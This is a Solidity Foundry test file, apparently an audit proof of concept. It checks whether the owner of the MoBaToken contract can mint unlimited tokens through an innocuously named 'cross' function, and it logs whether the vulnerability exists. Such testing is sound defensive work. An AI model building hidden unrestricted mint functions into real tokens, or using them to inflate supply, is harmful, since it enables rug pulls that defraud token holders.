// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MoBaToken.sol";

contract MoBaTokenTest is Test {
    MoBaToken token;
    address owner = address(0x1);
    address recipient = address(0x2);
    
    function setUp() public {
        vm.startPrank(owner);
        token = new MoBaToken("MyToken", "MT");
        vm.stopPrank();
    }
    
    function test_ownerCanInflateSupply() public {
        // Initial state checks
        assertEq(token.totalSupply(), 0, "Initial supply not zero");
        
        // Owner makes initial small mint
        vm.prank(owner);
        token.cross(recipient, 10);
        uint256 supplyAfterFirstMint = token.totalSupply();
        assertEq(supplyAfterFirstMint, 10, "Small mint failed");
        assertEq(token.balanceOf(recipient), 10, "Recipient didn't receive tokens");
        
        // After some time, owner prepares to make massive mint
        vm.warp(block.timestamp + 365 days); // Advance time by 1 year
        
        // Record state BEFORE massive mint
        console.log("--- BEFORE massive mint ---");
        uint256 totalSupplyBefore = token.totalSupply();
        uint256 recipientBalanceBefore = token.balanceOf(recipient);
        console.log("Total supply before :", totalSupplyBefore);
        console.log("Recipient balance before :", recipientBalanceBefore);
        
        // Critical Attack Operation: Massive mint
        console.log("--- Trigger: massive mint operation ---");
        vm.prank(owner);
        token.cross(recipient, 1_000_000);
        
        // Record state AFTER massive mint
        console.log("--- AFTER massive mint ---");
        uint256 totalSupplyAfter = token.totalSupply();
        uint256 recipientBalanceAfter = token.balanceOf(recipient);
        console.log("Total supply after :", totalSupplyAfter);
        console.log("Recipient balance after :", recipientBalanceAfter);
        
        // Differential Validation
        uint256 supplyDifference = totalSupplyAfter - totalSupplyBefore;
        uint256 balanceDifference = recipientBalanceAfter - recipientBalanceBefore;
        console.log("Total supply change :", supplyDifference);
        console.log("Recipient balance change :", balanceDifference);
        
        // Final Verification
        if (supplyDifference == 1_000_000 && balanceDifference == 1_000_000) {
            console.log("Vulnerability Exists: Owner can arbitrarily mint tokens without restrictions.");
        } else {
            console.log("Vulnerability not Exist: Minting restrictions exist or amounts mismatched.");
        }
    }
}